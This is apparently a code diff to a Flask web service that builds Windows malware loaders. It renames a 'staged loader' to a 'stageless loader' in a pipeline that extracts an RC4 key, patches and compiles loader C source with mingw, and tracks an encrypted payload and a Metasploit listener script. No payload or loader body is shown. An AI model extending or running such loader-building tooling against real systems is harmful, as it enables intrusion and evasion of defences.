@@ -14,7 +14,7 @@ from flask import Flask, request, jsonify
 app = Flask(__name__)
 
 # Base directory
-BASE_DIR = Path(__file__).parent.parent / "staged-loader"
+BASE_DIR = Path(__file__).parent.parent / "stageless-loader"
 
 # Track running background processes
 running_processes = {
@@ -106,8 +106,8 @@ def generate_stageless_loader():
                 'error': 'Could not extract RC4 key from payload_keys.h'
             }), 500
 
-        # Update staged_loader.c
-        loader_source = work_dir / "staged_loader.c"
+        # Update stageless_loader.c
+        loader_source = work_dir / "stageless_loader.c"
         with open(loader_source, 'r') as f:
             loader_code = f.read()
 
@@ -124,7 +124,7 @@ def generate_stageless_loader():
             f.write(loader_code)
 
         # Step 4: Compile loader
-        loader_exe = work_dir / "staged_loader.exe"
+        loader_exe = work_dir / "stageless_loader.exe"
         cmd = [
             "x86_64-w64-mingw32-gcc",
             "-O2", "-s",
@@ -209,12 +209,12 @@ def check_status():
             work_dir = BASE_DIR
 
         files_to_check = {
-            "staged_loader.exe": "Loader binary",
+            "stageless_loader.exe": "Loader binary",
             "payload.enc": "Encrypted payload",
             "start_server.sh": "HTTP server script",
             "start_listener.sh": "Metasploit listener script",
             "encrypt_payload.py": "Encryption tool",
-            "staged_loader.c": "Loader source code"
+            "stageless_loader.c": "Loader source code"
         }
 
         files_status = {}
